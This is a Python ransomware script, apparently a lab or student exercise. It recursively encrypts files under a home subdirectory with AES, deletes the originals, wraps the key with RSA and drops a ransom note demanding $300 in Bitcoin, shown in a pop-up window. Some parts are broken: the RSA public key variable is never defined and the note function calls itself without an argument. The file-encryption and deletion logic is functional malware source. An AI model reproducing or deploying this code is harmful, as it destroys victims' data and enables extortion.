import Crypto, ast, os, sys, glob, socket, base64, hashlib, tkinter, webbrowser, time, random, io, base64
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
from tkinter import *
from Crypto import Random
from os.path import expanduser
from urllib2 import urlopen


#significant help on getting AES encryption to work from
#https://github.com/the-javapocalypse/Python-File-Encryptor/blob/master/script.py

def pad(s):
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

def encrypt(message, key, key_size=256):
    message = pad(message)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(message)

def encrypt_file(key, file_name):
    with open(file_name, 'rb') as fo:
        plaintext = fo.read()
    enc = encrypt(plaintext, key)
    with open(file_name + ".enc", 'wb') as fo:
        fo.write(enc)
    os.remove(file_name)

def decrypt(ciphertext, key):
        iv = ciphertext[:AES.block_size]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        plaintext = cipher.decrypt(ciphertext[AES.block_size:])
        return plaintext.rstrip(b"\0")

def decrypt_file(key, file_name):
    with open(file_name, 'rb') as fo:
        ciphertext = fo.read()
    dec = decrypt(ciphertext, key)
    with open(file_name[:-4], 'wb') as fo:
        fo.write(dec)
    os.remove(file_name)

#traversing the file system to encrypt files
def traverse_files(nwd, aes_key, depth):
    # get list of files and directories in current directory
    search_dir = nwd + "/*"
    files = glob.glob(search_dir)
    # want to make sure there are files to encrypt or directories to search
    while files:
        for path in files:
            req1 = 'Home' in os.path.basename(os.path.normpath(path))
            req2 = 'home' in os.path.basename(os.path.normpath(path))
            req3 = 'INFO' in os.path.basename(os.path.normpath(path))

            if not os.path.isdir(path):
                encrypt_file(aes_key, path)
                #print((depth*'  ') + "|F: " + os.path.basename(os.path.normpath(path)))

            elif os.path.isdir(path) and not req2 and not req2 and not req3:
                traverse_files(path, aes_key, depth + 1)
                #print("|" + (depth*'- ') + "D: " + os.path.basename(os.path.normpath(path)))
        files = []

def display_note(dir):

    note = """ Q: What has happened to my computer

    All of your files have been encrypted using AES encryption.


Q: Can I recover my files?

    Yes you can. Just send $300 of Bitcoin to this Bitcoin address:

                  1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

    Bitcoins can be purchased from Coinbase at the URL:

                  https://www.coinbase.com/buy-bitcoin

    Then, send an email to the email address you received this file from and we
    will send you the decryption program.
    """

    f = open (dir + "/RANSOMNOTE.txt", 'w')
    f.write(note) #write ciphertext to file
    f.close()

    master = Tk()
    master.title('RANSOMWARE ATTACK')
    msg = Message(master, text = note)
    msg.config(bg='red', font=('times', 24, 'italic'))
    msg.pack()
    mainloop()
    display_note()

def main():
    #### PUBLIC ENCRYPTION KEY WILL BE ADDED HERE ####


    rsa_key = RSA.importKey(public_key)
    pub_key = rsa_key.publickey()

    #generate a random AES key, pass it to the traverse function which will
    #use it for encrypting individual files
    #represented in bytes 32 bytes = 256 bits
    aes_key = os.urandom(32)

    #start from the home directory, pass it to the traverse function
    home = expanduser('~')
    cwd = home + '/TestFiles'
    print(cwd + "\n")
    traverse_files(cwd, aes_key, 0)

    encrypted_key = pub_key.encrypt(aes_key, 32)

    home = expanduser('~')
    info_dir = home + '/Desktop/INFO'
    if not os.path.exists(info_dir):
        os.makedirs(info_dir)

    f = open (info_dir + "/encryptedKey.txt", 'w')
    f.write(str(encrypted_key)) #write ciphertext to file
    f.close()

    display_note(info_dir)

if __name__ == "__main__":
    main()
